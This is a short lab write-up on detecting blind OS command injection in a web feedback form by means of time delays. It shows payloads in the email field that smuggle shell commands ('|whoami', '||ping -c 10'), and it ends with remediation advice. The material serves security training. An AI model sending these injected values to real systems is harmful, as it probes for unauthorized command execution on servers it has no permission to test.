## 🧪 Lab: Blind OS Command Injection with Time Delays  
**Level**: Practitioner  
**Date**: June 18, 2025  
**Goal**: Exploit a blind OS command injection vulnerability by using time delays to confirm successful command execution.

---

### 🧰 Tools  
- Burp Suite (Repeater / Interceptor)  
- Timing-based payloads (`ping`, `sleep`)

---

### 🧭 Steps

1. Intercept the feedback form request:
POST /feedback/submit

Example fields:
name=John
email=john@example.com
message=Hello!


2. Send the request to Repeater.

3. Attempt basic command injection (no output expected):

```
email=test@test.com|whoami
```

❌ No visible output → Possible blind injection.

4. Attempt time-based payload to detect blind injection:

```
email=aaa@test.com||ping+-c+10+127.0.0.1
```

✅ Server delays for ~10 seconds → Successful time-based confirmation.

---

### 💣 Payload

```
email=aaa@test.com||ping+-c+10+127.0.0.1
```

---

### 💡 Observations

- No command output = blind vulnerability.
- `||` ensures the injected command runs even if previous fails.
- Delay confirms command execution.
- Email field passed to backend shell → high-risk injection point.

---

### 🔒 Remediation

- Never pass unsanitized input to system shell.
- Use language-native mailing functions instead of shell commands.
- Apply strict input validation and allow-lists.
- Sanitize every field, even those assumed "safe" (like `email`).
- Monitor backend performance for unusual latency patterns.